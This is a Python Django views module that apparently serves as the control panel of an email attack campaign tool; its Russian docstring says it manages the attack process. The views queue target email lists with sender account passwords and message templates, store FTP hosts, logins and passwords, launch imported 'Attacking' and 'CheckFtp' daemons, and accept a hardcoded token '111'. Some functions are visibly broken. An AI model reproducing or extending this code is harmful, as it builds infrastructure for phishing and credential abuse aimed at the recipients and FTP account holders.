from datetime import date
from django.http import JsonResponse
from core.attack import Attacking
from .models.Stack import Stack
from .models.Templates import Templates
from core.daemon import get_config
from core.checker import CheckFtp

"""выполняет управление процессом атак:
добавляет, редактирует, удаляет

"""


def add_to_stack(request):
    if 'token' not in request.POST:
        return JsonResponse({'response': 'no token'})
    if 'emails' not in request.POST or 'sender' not in request.POST or 'sender_password' not in request.POST or \
            'subject' not in request.POST or 'body_name' not in request.POST or 'method' not in request.POST or \
            'country' not in request.POST or 'description' not in request.POST:
        return JsonResponse({'response': 'no actual fields'})
    email_count = 0
    emls = request.POST['emails']
    emails = emls.split(",")
    for email in emails:
        email_count += 1
        new_stack = Stack()
        new_stack.sender = request.POST['sender']
        new_stack.sender_password = request.POST['sender_password']
        new_stack.email = email
        new_stack.subject = request.POST['subject']
        try:
            new_stack.body = Templates.objects.get(name=request.POST['body_name']).body
        except Templates.DoesNotExist:
            new_stack.body = ''
        new_stack.method = request.POST['method']
        new_stack.date_add = date.today()
        new_stack.country = request.POST['country']
        new_stack.description = request.POST['description']
        new_stack.ftp_host = request.POST['host']
        new_stack.ftp_login = request.POST['user']
        new_stack.ftp_password = request.POST['pswd']
        new_stack.status = '0'
        new_stack.save()
        del new_stack
    if email_count > 0:
        if get_config('attacking') == '0':
            atk = Attacking()
            atk.start()
        if get_config('checking_ftp') == '0':
            check = CheckFtp()
            check.start()
    return JsonResponse({'response': 'add: ' + str(email_count) + ' emails'})


def edit_from_stack(request):
    if 'emails' not in request.POST or 'sender' not in request.POST or 'sender_password' not in request.POST or \
            'subject' not in request.POST or 'body_name' not in request.POST or 'method' not in request.POST or \
            'country' not in request.POST or 'description' not in request.POST:
        return JsonResponse({'response': 'no actual fields'})
    try:
        new_stack = Stack.objects.get(email=request.POST['email'])
    except Stack.DoesNotExist:
        return JsonResponse({"response": "not_exist"})
    new_stack.sender = request.POST['sender']
    new_stack.sender_password = request.POST['sender_password']
    new_stack.email = request.POST['email']
    new_stack.subject = request.POST['subject']
    try:
        new_stack.body = Templates.objects.get(name=request.POST['body_name']).body
    except Templates.DoesNotExist:
        new_stack.body = ''
    new_stack.method = request.POST['method']
    new_stack.country = request.POST['country']
    new_stack.description = request.POST['description']
    new_stack.status = '0'
    new_stack.save()
    return JsonResponse({"response": "ok"})


def delete_from_stack(request):
    if 'emails' not in request.POST or 'sender' not in request.POST or 'sender_password' not in request.POST or \
            'subject' not in request.POST or 'body' not in request.POST or 'method' not in request.POST or \
            'country' not in request.POST or 'description' not in request.POST:
        return JsonResponse({'response': 'no actual fields'})
    try:
        new_stack = Stack.objects.get(email=request.POST['email'])
    except Stack.DoesNotExist:
        return JsonResponse({"response": "not_exist"})
    new_stack.delete()
    return JsonResponse({"response": "ok"})


def get_info_about_target(request):
    if 'token' not in request.GET and 'email' not in request.GET:
        return JsonResponse({'response': 'filed error'})
    if request.GET['token'] != '111':
        return JsonResponse({'response': 'denied'})
    eml = Stack.objects.get()
    return ''


def load_template(request):
    if 'token' not in request.POST and 'name' not in request.POST and 'description' not in request.POST and \
            'template' not in request.POST:
        return JsonResponse({'response': 'filed error'})
    if request.POST['token'] != '111':
        return JsonResponse({'response': 'denied'})
    template = Templates()
    template.name = request.POST['name']
    template.body = request.POST['template']
    template.description = request.POST['description']
    template.save()
    return JsonResponse({"response": "ok"})


def get_templates(request):
    if 'token' not in request.GET:
        return JsonResponse({'response': 'filed error'})
    if request.GET['token'] != '111':
        return JsonResponse({'response': 'denied'})
    try:
        templates = Templates.objects.all()
    except Templates.DoesNotExist:
        return JsonResponse({'response': 'no templates'})
    response = {'response': 'ok', 'count': templates.count()}
    records = []
    for template in templates:
        tmp_dic = {
            'name': template.name,
            'description': template.description,
            'body': template.body}
        records.append(tmp_dic)
        del tmp_dic
    response['templates'] = records
    return JsonResponse(response)
